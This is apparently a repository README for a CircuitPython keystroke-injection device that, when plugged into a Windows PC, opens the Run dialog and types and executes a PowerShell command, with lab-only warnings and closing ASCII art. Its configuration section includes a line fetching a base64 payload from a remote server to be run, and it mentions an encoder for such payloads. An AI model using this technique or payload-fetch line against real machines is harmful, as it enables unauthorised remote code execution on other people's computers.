# USB HID Keyboard Script (Automated PowerShell Typing)

This repository contains a **Python/CircuitPython script** that allows a microcontroller (such as an Adafruit board/rasberry pi pico) to emulate a USB keyboard. The script types a predefined PowerShell command automatically when plugged into a Windows computer.

> **Warning:** This script can execute arbitrary commands. Only use on your own machines or in a controlled lab environment.

---

## Features

- Waits a few seconds after plugging in to allow user focus.
- Opens the Windows Run dialog (`Win+R`).
- Types a PowerShell command line automatically.
- Presses Enter to execute the command.

---

## Requirements

- A compatible microcontroller running **CircuitPython**.
- [Adafruit HID library](https://circuitpython.org/libraries#adafruit-hid) installed.
- Python 3.x
- An editor according to preference (neovim/vs codium)
- A Windows PC for testing (the script targets Windows Run dialog).

---

## Configuration

Before using, **edit the script to replace placeholders**:

1. **Payload URL**

- change the ip address to where you host your remote server

```python
$b64=(irm http://192.168.4.1/payload).Content
```

- Adjust the initial delay if your computer takes longer to recognize the USB device

```python
time.sleep(3)
```

- Modify this to increase/decrease typing delay for reliability

```python
time.sleep(0.02)
```

## Usage

1. Copy the script to your **CircuitPython device**.
2. Plug the microcontroller into a **Windows PC**.
3. Ensure the PC is ready (have a text editor or Run dialog open if testing safely).
4. The script will automatically type the PowerShell command and execute it.

---

## Safety Notice

This script **can run arbitrary code** on your machine.

- Use it **only for educational purposes**.
- Replace URLs and commands with harmless scripts for learning.
- Testing on other people's machines without consent is illegal.

---

## Notes

- Payload should encode to **base64**.(This repo contains a encoder if you need to encode your powershell commands into base64)
- The script currently handles only alphanumeric characters correctly.
- Symbols and special characters may need extra mapping.
- Modify the `payload` string and typing loop for custom commands or messages.



⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣀⠀⢀⣼⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣷⣾⣿⣿⣷⣤⣤⣶⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⡦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣘⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣍⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠉⢽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣸⣀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⡛⣃⣤⣄⠀⠀⠀⠀⠀⣀⣀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠻⣿⣿⣿⣆⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⢠⣿⣿⣟⠛⠛⡏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠉⣿⣿⣆⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣼⣿⡟⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠘⣿⣿⡆⢰⣿⡏⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠘⣿⣿⣿⣿⠃⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠘⣿⣿⡏⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠘⠟⠁⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣇⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠓⠒⠒⠒⠒⠒⠒⠒⠒⠒⠒⠒⠒⠚⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣠⣶⢶⣦⠀⣶⡶⠶⠆⣠⣶⣶⣶⣦⠀⠀⠀⣠⡶⢶⣦⠀⢀⣴⡶⣶⣦⢀⣶⠀⠰⣦⠀⣶⡄⠀⣶⠀⢰⡆⢰⣆⠀⣴⣶⠶⡆⣶⣶⣶⣶⣆⣶⡆⠀⢀⣦
⣸⡟⠀⠀⠀⠀⣿⣦⣤⠀⠉⠀⣿⡆⠀⠀⠀⠀⢿⣷⣤⡀⠀⣾⡏⠀⠀⠁⢸⣿⣤⣴⣿⡆⣿⡇⢠⣿⠀⣸⡇⢸⣿⠀⣿⣥⣤⠀⠈⢹⣿⠀⠀⠸⣿⣄⣼⠇
⢻⣧⡀⢸⣿⢀⣿⠉⠀⠀⠀⠀⣿⡇⠀⠀⠀⠠⣦⡈⠙⣿⡆⢿⣧⡀⢀⣠⢸⣿⠉⠀⣿⡇⢹⣧⣼⢿⣦⡿⠀⢸⣿⠀⣿⡏⠉⠀⠀⢸⣿⠀⠀⠀⢹⣿⠏⠀
⠈⠻⠿⠿⠋⠸⠟⠛⠛⠓⠀⠀⠿⠃⠀⠀⠀⠀⠙⠿⠿⠟⠁⠈⠻⠿⠿⠃⠘⠟⠀⠀⠛⠁⠀⠻⠃⠈⠛⠁⠀⠘⠟⠀⠻⠇⠀⠀⠀⠸⠿⠀⠀⠀⠺⠿⠀⠀